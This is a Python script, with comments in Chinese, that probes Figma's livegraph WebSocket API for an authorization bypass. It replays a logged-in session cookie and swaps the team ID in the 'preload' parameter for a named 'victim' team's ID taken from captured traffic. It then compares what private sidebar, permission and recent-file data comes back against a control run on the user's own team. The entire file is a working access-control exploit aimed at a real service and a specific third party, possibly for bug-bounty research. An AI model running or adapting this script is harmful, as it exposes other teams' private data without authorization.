"""Figma livegraph preload 越权测试：登录态 cookie + preload teamId 替换为其他团队
对照组：自己的 teamId（正常） vs 其他团队 teamId=1484993099407069875（公开文件作者的团队，来源：anon_capture2.json）
若替换后服务端仍推送 FileBrowserSidebarData 完整数据 -> 越权
"""
import json, sys, time, urllib.parse
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SELF_TEAM = "1666382706663462213"
VICTIM_TEAM = "1484993099407069875"  # 确定性来源：anon frames 中 TeamByIdForPlanUserView/TeamByIdForPlanView
SELF_USER = "1666382703778278399"
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"


def cookie_header():
    cookies = json.load(open(r"D:\scan\_figma_hunt\figma_session.json", encoding="utf-8"))
    parts = [f"{c['name']}={c['value']}" for c in cookies
             if c.get("domain") in ("www.figma.com", "figma.com", ".figma.com", ".www.figma.com")]
    return "; ".join(parts)


def build_url(team_id):
    line = open(r"D:\scan\_figma_hunt\ws_url_fresh.txt").read().strip()
    q = urllib.parse.urlparse(line).query
    params = urllib.parse.parse_qs(q)
    preload = json.loads(params["preload"][0])
    # 替换所有 teamId / currentTeamId
    for k, v in preload.items():
        args = v.get("args", {})
        if "teamId" in args:
            args["teamId"] = team_id
        if "currentTeamId" in args:
            args["currentTeamId"] = team_id
    params["preload"] = [json.dumps(preload, separators=(",", ":"))]
    # 刷新时间戳与 ph（ph 未知算法，先保留原值，若被拒则降级不带 preload 手发 subscribe）
    query = urllib.parse.urlencode({k: v[0] for k, v in params.items()})
    return f"wss://www.figma.com/api/livegraph?{query}"


def run(url, team_id, label, wait=10):
    print(f"\n===== {label} (team={team_id}) =====")
    ws = websocket.create_connection(url, timeout=20, origin="https://www.figma.com",
                                     header=["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
                                             f"Cookie: {cookie_header()}"])
    auth = {"messageType": "auth", "clientType": "web",
            "args": {"userId": SELF_USER, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": COMMIT,
                     "clientUrl": "https://www.figma.com/files/team/1666382706663462213/recents-and-sharing"},
            "clientRequestedVersion": 2}
    ws.send(json.dumps(auth))
    hits = []
    end = time.time() + wait
    while time.time() < end:
        try:
            ws.settimeout(min(3, end - time.time()))
            opcode, data = ws.recv_data()
            if opcode != 0x1:
                continue
            try:
                msg = json.loads(data)
            except Exception:
                continue
            mt = msg.get("messageType", "?")
            if mt == "authSuccess":
                print("  authSuccess:", msg.get("userId"))
            elif mt == "denormalizedPendingMutations":
                for key, payload in msg.get("mutations", {}).items():
                    if any(v in key for v in ("FileBrowserSidebarData", "CurrentTeamCombinedPermissions",
                                              "FileBrowserPaginatedRecentFilesView")):
                        hits.append((key, payload))
                        p = json.dumps(payload, ensure_ascii=False)
                        print(f"  [HIT] {key[:140]}")
                        print(f"        {p[:500]}")
            elif mt == "error":
                print("  [ERR]", json.dumps(msg, ensure_ascii=False)[:250])
            elif mt == "connectionClosed":
                print("  connectionClosed")
                break
        except Exception:
            break
    ws.close()
    return hits


if __name__ == "__main__":
    h1 = run(build_url(SELF_TEAM), SELF_TEAM, "对照: 自己的团队")
    print(f"\n>> 自己的团队 命中 {len(h1)} 条")
    h2 = run(build_url(VICTIM_TEAM), VICTIM_TEAM, "越权测试: 其他团队")
    print(f"\n>> 其他团队 命中 {len(h2)} 条")
